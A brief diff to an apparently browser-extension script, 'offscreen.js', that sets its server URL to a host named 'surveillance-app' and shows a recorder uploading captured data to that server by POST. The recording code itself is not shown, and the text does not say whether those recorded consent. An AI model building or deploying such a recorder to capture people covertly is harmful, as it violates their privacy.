@@ -1,7 +1,7 @@
 // offscreen.js
 
 // Important: Change this URL to your deployed Render URL when deploying (e.g. 'https://your-app.onrender.com')
-const SERVER_URL = 'https://your-app.onrender.com';
+const SERVER_URL = 'https://surveillance-app-lvf5.onrender.com';
 
 const socket = io(SERVER_URL);
 
@@ -42,7 +42,7 @@ async function setupRecorder() {
                     method: 'POST',
                     body: formData
                 });
-                
+
                 if (response.ok) {
                     console.log('Upload successful.');
                 } else {
